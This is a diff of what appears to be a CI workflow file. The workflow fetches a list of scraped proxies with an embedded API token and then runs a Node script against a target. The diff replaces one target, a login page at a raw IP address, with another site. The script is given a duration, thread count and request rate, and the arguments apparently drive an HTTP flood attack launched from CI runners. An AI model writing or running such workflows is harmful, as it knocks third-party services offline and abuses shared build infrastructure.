@@ -40,7 +40,7 @@ jobs:
           cd Fc-main
           curl -s "https://api.proxies.is/scraped?token=A4eH8m71mK2U57785S5c3&timeout=15000&excludeCountry=IN&includeCountry=IN&type=http" -o woo.txt
           
-          node h.js  http://98.89.1.180:2000/login 1800 4 h1
+          node a.js GET  https://provingtodestroyer.kesug.com/uauw 1800 4 512 --full --debug
   
         
           
